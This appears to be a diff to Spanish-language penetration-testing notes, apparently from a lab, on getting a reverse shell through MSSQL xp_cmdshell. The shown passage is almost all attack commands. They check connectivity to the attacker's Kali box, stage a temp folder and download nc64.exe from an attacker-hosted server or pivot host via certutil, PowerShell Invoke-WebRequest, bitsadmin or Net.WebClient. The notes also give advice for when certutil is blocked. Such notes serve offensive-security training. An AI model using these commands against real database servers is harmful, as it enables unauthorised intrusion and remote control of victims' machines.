@@ -192,17 +192,29 @@ Paso 4:
 
 ```bash 
 # REVERSHELL
+Paso 0: 
+# Verificar la conectividad con Kali o con el primer server pivote 'MS01'
+EXEC xp_cmdshell 'ping IP_Kali' 
+
 Paso 1:
 # Crear directorio temporal si no existe
 ❯ xp_cmdshell "mkdir C:\Temp"
-
+❯ xp_cmdshell "dir C:\Temp"   # Mirar el contenido del directorio 
 
 # Paso 2 → Descargar nc64.exe desde Kali
 ❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://❮IP_KALI❯/nc64.exe C:\temp\nc64.exe'
 # Antes: 
 	python3 -m http.server 80   # Compartir el Netcat desde Kali 
 
-# Alternativa a certutil
+NOTA:
+	- Si la descarga se hace desde una segunda red. Apuntar al server MS01 que es el pivote y no a Kali. 
+	- Si sale el siguiente error: ERROR(MS02\SQLEXPRESS): Line 1: An error occurred during the execution of xp_cmdshell. A call to 'CreateProcess' failed with error code: '5'. Quiere decir que 'certuril' esta siendo bloqueado y toca usar otro comando de descarga.
+
+# Alternativas a certutil  
+❯ EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://IP_MS01/nc64.exe -OutFile C:\Temp\nc64.exe"'    <- MEJOR OPCIÓN  
+
+❯ EXEC xp_cmdshell 'bitsadmin /transfer job http://IP_MS01/nc64.exe C:\Windows\Temp\nc64.exe'
+
 ❯ xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\"http://❮IP_KALI❯/nc64.exe\",\"C:\temp\nc64.exe\")"'
 
 
